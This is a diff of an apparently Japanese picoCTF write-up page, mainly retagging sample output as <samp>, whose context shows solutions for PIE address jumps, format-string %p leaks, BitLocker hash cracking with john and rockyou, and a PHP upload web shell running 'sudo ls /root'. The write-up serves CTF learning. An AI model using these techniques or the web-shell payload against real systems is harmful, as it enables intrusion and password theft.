@@ -7,9 +7,10 @@
 	<link rel="stylesheet" href="/css/default.css">
 	<link rel="stylesheet" href="/css/code.css">
 	<style>
-		details > summary{font-family: 'Consolas',monospace; font-size: 1.15em;}
-		details.solved > summary{color: #00c000;}
-		details.unsolved > summary{color: #c00000;}
+		details { padding-left: 0; }
+		details > summary{ margin-left: 0; font-family: 'Consolas',monospace; font-size: 1.15em; }
+		details.solved > summary{ color: #00c000; }
+		details.unsolved > summary{ color: #c00000; }
 	</style>
 </head>
 <body class="body_w60">
@@ -48,13 +49,13 @@ foo();</code></pre>
 		</div>
 		<div>
 			<p><code class="bash">nc rescued-float.picoctf.net XXXXX</code></p>
-			<pre><code class="output">Address of main: 0x59e47fc5c33d
-Enter the address to jump to, ex => 0x12345: </code></pre>
+			<pre><samp>Address of main: 0x59e47fc5c33d
+Enter the address to jump to, ex => 0x12345: </samp></pre>
 		</div>
 		<div>
 			<p><a href="https://www.google.com/search?q=0x33d-0x96" target="_blank">0x33d - 0x96</a> = 0x2a7 なので、</p>
 			<p><code>0x59e47fc5c2a7</code>が<code>win()</code>の位置</p>
-			<p><code class="output">Enter the address to jump to, ex => 0x12345: </code><code>0x59e47fc5c2a7</code></p>
+			<p><samp>Enter the address to jump to, ex => 0x12345: </samp><code>0x59e47fc5c2a7</code></p>
 		</div>
 		<div><p><code>picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_********}</code></p></div>
 	</details>
@@ -146,7 +147,7 @@ setuid(0);</code></pre>
 			<p><code>printf([ユーザーの入力]);</code>は良く知られた脆弱性で、そこを突いた攻撃は書式文字列攻撃という。</p>
 			<p>printfの第1引数に<code>%p</code>が使われると、そこに代入されるのはスタックに保存された値(16進表記)なので、</p>
 			<p><code>%p%p%p%p....</code>を入力すれば、スタックの中身が</p>
-			<p><code class="output">0x2e70257025702570(nil)0x555f507c62ad0x7ffcf1214760....</code>と出力される</p>
+			<p><samp>0x2e70257025702570(nil)0x555f507c62ad0x7ffcf1214760....</samp>と出力される</p>
 		</div>
 		<div>
 			<p>また、PIE TIME から分かるように、ポインタの16進数の下3桁はデコンパイルした時の値と同じになるようなので、</p>
@@ -165,7 +166,7 @@ setuid(0);</code></pre>
 		</div>
 		<div>
 			<p><code>%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p</code>を入力すると、</p>
-			<p><code class="output">0x5ea28f7132a1_...(略)..._0x5ea254c2a<strong>1c0</strong>_...(略)..._0x7a3392b9d083</code>と返された</p>
+			<p><samp>0x5ea28f7132a1_...(略)..._0x5ea254c2a<strong>1c0</strong>_...(略)..._0x7a3392b9d083</samp>と返された</p>
 			<p>1c0 が<code>_start</code>と対応していると推測すると、<code>win()</code>のポインタは<code>0x5ea254c2a<strong>36a</strong></code>と予想できる。</p>
 			<p>これを入力するとフラグを入手できた</p>
 		</div>
@@ -199,20 +200,20 @@ setuid(0);</code></pre>
 	<details class="solved"><summary>200 points | Guess My Cheese (Part 1)</summary>
 		<div>
 			<p><code class="bash">nc verbal-sleep.picoctf.net 58487</code></p>
-			<pre><code class="output">Here's my secret cheese -- if you're Squeexy, you'll be able to guess it:  VZOONNKWKV
+			<pre><samp>Here's my secret cheese -- if you're Squeexy, you'll be able to guess it:  VZOONNKWKV
 Hint: The cheeses are top secret and limited edition, so they might look different from cheeses you're used to!
 Commands: (g)uess my cheese or (e)ncrypt a cheese
-What would you like to do?</code></pre>
+What would you like to do?</samp></pre>
 		</div>
 		<div>
 			<p>単一換字式暗号だと思うけど、総当たりは無理なので何かしらの名前がついた暗号化形式だと思う。</p>
 			<p>とりあえず(e)ncrypt a cheeseしてみる</p>
 		</div>
 		<div>
-			<pre><code class="output">What would you like to do?
+			<pre><samp>What would you like to do?
 e
-What cheese would you like to encrypt? </code><code>cheese</code></pre>
-			<p><code class="output">I'm sorry I haven't had that cheese before, so I can't encrypt it!</code></p>
+What cheese would you like to encrypt? </samp><code>cheese</code></pre>
+			<p><samp>I'm sorry I haven't had that cheese before, so I can't encrypt it!</samp></p>
 		</div>
 		<div>
 			<p>cheeseはチーズの名前ではないみたい それはそうか...</p>
@@ -222,15 +223,15 @@ What cheese would you like to encrypt? </code><code>cheese</code></pre>
 			<p>Bergader とか良さそう</p>
 		</div>
 		<div>
-			<p><code class="output">What cheese would you like to encrypt? </code><code>Bergader</code></p>
-			<p><code class="output">Here's your encrypted cheese:  ONAVXWNA</code></p>
+			<p><samp>What cheese would you like to encrypt? </samp><code>Bergader</code></p>
+			<p><samp>Here's your encrypted cheese:  ONAVXWNA</samp></p>
 		</div>
 		<div>
 			<p><a href="https://www.dcode.fr/cipher-identifier" target="_blank">>> Cipher Identifier</a></p>
 			<p>で Affine Cipher らしいということが分かったので</p>
 			<p><a href="https://www.dcode.fr/affine-cipher" target="_blank">>> Affine Cipher</a></p>
 			<p>に突っ込むと、Resultの上から7番目に来ました。それらしい結果を上に表示してくれるみたいです。</p>
-			<p><code class="output">A=17,B=23&Tab;BERGADER</code></p>
+			<p><samp>A=17,B=23&Tab;BERGADER</samp></p>
 			<p>これをもとにVZOONNKWKVを復号化すると、</p>
 			<p><code>GUBBEENDNG</code></p>
 			<p><strong>そのまま</strong>入力するとフラグを入手できた</p>
@@ -268,7 +269,7 @@ What cheese would you like to encrypt? </code><code>cheese</code></pre>
 		<div>
 			<p>pcapファイルを<a href="https://www.wireshark.org/" target="_blank">>> Wireshark</a>で開く</p>
 			<p>時系列順にすると、<code>TCP Payload</code>(送信データの本体)の長さがきれいに並ぶので、表示を<code>TCP Payload</code>のみにして、すべてコピーすると、</p>
-			<pre><code class="output">7935305a646d493d
+			<pre><samp>7935305a646d493d
 6f62306f3569303d
 36646d645738553d
 4b5748393856633d
@@ -289,7 +290,7 @@ What cheese would you like to encrypt? </code><code>cheese</code></pre>
 587a4d3063336c6664413d3d
 596d68664e484a664f413d3d
 5a5445775a54677a4f513d3d
-66513d3d</code></pre>
+66513d3d</samp></pre>
 			<p><a href="https://gchq.github.io/CyberChef/" target="_blank">>> CyberChef</a>で<a href="https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')" target="_blank">From Hex</a>にかけるとBase64文字列らしくなる(=で終わる)ので、</p>
 			<p>さらに<a href="https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')From_Base64('A-Za-z0-9%2B/%3D',true,false)" target="_blank">From Base64</a>にかけると出力の末尾にフラグが見つかる</p>
 			<p><small>正直あんまりCyberChef使いたくないけどね</small></p>
@@ -299,14 +300,14 @@ What cheese would you like to encrypt? </code><code>cheese</code></pre>
 	<details class="solved"><summary>100 points | RED</summary>
 		<div>
 			<p>tEXtチャンクを見てみると、</p>
-			<pre><code class="output">Crimson heart, vibrant and bold,
+			<pre><samp>Crimson heart, vibrant and bold,
 Hearts flutter at your sight.
 Evenings glow softly red,
 Cherries burst with sweet life.
 Kisses linger with your warmth.
 Love deep as merlot.
 Scarlet leaves falling softly,
-Bold in every stroke.</code></pre>
+Bold in every stroke.</samp></pre>
 			<p>というPoemがあるが、文の最初の文字をつなげると、<strong>CHECKLSB</strong>となる</p>
 			<p>LSBとは最下位ビットのことで、画像の最下位ビットを変えても視覚的には判別できないため情報を隠すために使われる</p>
 			<p>LSBだけを抜き出して画像にする(0なら0、1なら255)と以下のようになる</p>
@@ -382,20 +383,20 @@ Bold in every stroke.</code></pre>
 		<div>
 			<p>まず、<code>bitlocker-1.dd</code>からハッシュを抽出するために、<code>bitlocker2john.exe</code>を使う。</p>
 			<p><code class="cmd">bitlocker2john.exe ..\..\bitlocker-1.dd</code></p>
-			<pre><code class="output">User Password hash:
+			<pre><samp>User Password hash:
 <small>$bitlocker$0$16$cb4809fe9628471a411f8380e0f668db$1048576$12$d04d9c58eed6da010a000000$60$68156e51e53f0a01c076a32ba2b2999a...(略)</small>
 Hash type: User Password with MAC verification (slower solution, no false positives)
 <small>$bitlocker$1$16$cb4809fe9628471a411f8380e0f668db$1048576$12$d04d9c58eed6da010a000000$60$68156e51e53f0a01c076a32ba2b2999a...(略)</small>
 Hash type: Recovery Password fast attack
 <small>$bitlocker$2$16$2b71884a0ef66f0b9de049a82a39d15b$1048576$12$00be8a46ead6da0106000000$60$a28f1a60db3e3fe4049a821c3aea5e4b...(略)</small>
 Hash type: Recovery Password with MAC verification (slower solution, no false positives)
-<small>$bitlocker$3$16$2b71884a0ef66f0b9de049a82a39d15b$1048576$12$00be8a46ead6da0106000000$60$a28f1a60db3e3fe4049a821c3aea5e4b...(略)</small></code></pre>
+<small>$bitlocker$3$16$2b71884a0ef66f0b9de049a82a39d15b$1048576$12$00be8a46ead6da0106000000$60$a28f1a60db3e3fe4049a821c3aea5e4b...(略)</small></samp></pre>
 			<p>今回欲しいのはユーザーパスワードなので、<code>$bitlocker$0$</code>をクラックする</p>
 			<p><code class="cmd">echo <small>$bitlocker$0$16$cb4809fe9628471a411f8380e0f668db$1048576$12$d04d9c58eed6da010a000000$60$68156e51e53f0a01c076a32ba2b2999a...(略)</small> > hash.txt</code></p>
 		</div>
 		<div>
 			<p><code class="cmd">john --wordlist=..\..\rockyou.txt hash.txt</code></p>
-			<p><code class="output">jacqueline       (?)</code></p>
+			<p><samp>jacqueline       (?)</samp></p>
 		</div>
 		<div>
 			<p>パスワードは<code>jacqueline</code>と分かった</p>
@@ -411,13 +412,13 @@ Hash type: Recovery Password with MAC verification (slower solution, no false po
 			<p><code class="bash">sudo apt-get install libfuse-dev</code></p>
 			<p><code class="bash">sudo mkdir /media/bitlocker /media/mount</code></p>
 			<p><code class="bash">sudo dislocker -r -V bitlocker-1.dd -u -- /media/bitlocker</code></p>
-			<p><code class="output">Enter the user password: </code><code>jacqueline</code></p>
+			<p><samp>Enter the user password: </samp><code>jacqueline</code></p>
 			<p><code class="bash">sudo -i</code></p>
 			<p><code class="root">cd /media/bitlocker</code></p>
 			<p><code class="root">mount -r -o loop dislocker-file /media/mount</code></p>
 			<p><code class="root">cd /media/mount</code></p>
 			<p><code class="root">ls</code></p>
-			<p><code class="output">'$RECYCLE.BIN'  'System Volume Information'   flag.txt</code></p>
+			<p><samp>'$RECYCLE.BIN'  'System Volume Information'   flag.txt</samp></p>
 			<p><code class="root">cat flag.txt</code></p>
 			<p>フラグを入手できた</p>
 		</div>
@@ -555,11 +556,11 @@ let decrypted_slice = std::slice::from_raw_parts(decrypted_ptr, decrypted_len);
 		false
 }</code></pre>
 			<pre><code class="bash">socat -t60 - TCP:standard-pizzas.picoctf.net:XXXXX &lt; sample.txt</code></pre>
-			<pre><code class="output">Status: Failed
+			<pre><samp>Status: Failed
 False Negatives Check: Testcase failed. Your rule generated a false negative.
 False Positives Check: Testcases passed!
 Stats: 61 testcase(s) passed. 1 failed. 2 testcase(s) unchecked. 64 total testcases.
-Pass all the testcases to get the flag.</code></pre>
+Pass all the testcases to get the flag.</samp></pre>
 		</div>
 		<div>
 			<p>64テストケース中61ケースがfalseで通ることが分かる。</p>
@@ -715,7 +716,7 @@ int main(){
 	<details class="solved"><summary>100 points | n0s4n1ty 1</summary>
 		<div>
 			<p>試しにファイルをアップロードしみると、<code>uploads.php</code>に転送され、</p>
-			<p><code class="output">The file [ファイル名] has been uploaded Path: uploads/[ファイル名]</code>との表示が出た</p>
+			<p><samp>The file [ファイル名] has been uploaded Path: uploads/[ファイル名]</samp>との表示が出た</p>
 			<p>また、<code>uploads/[ファイル名]</code>に移動すると、内容が表示された。(画像ファイルなら画像が表示され、テキストファイルならテキストが表示された)</p>
 			<p>phpで処理されていることから、phpファイルを送信すればその内容が実行されると考える</p>
 		</div>
@@ -723,7 +724,7 @@ int main(){
 			<p><code>send.php</code>の内容を</p>
 			<p><code>&lt;?php system("sudo ls /root") ?&gt;</code></p>
 			<p>として送信すると、<code>/uploads/send.php</code>では</p>
-			<p><code class="output">flag.txt</code>と表示された</p>
+			<p><samp>flag.txt</samp>と表示された</p>
 		</div>
 		<div>
 			<p><code>send.php</code>の内容を</p>
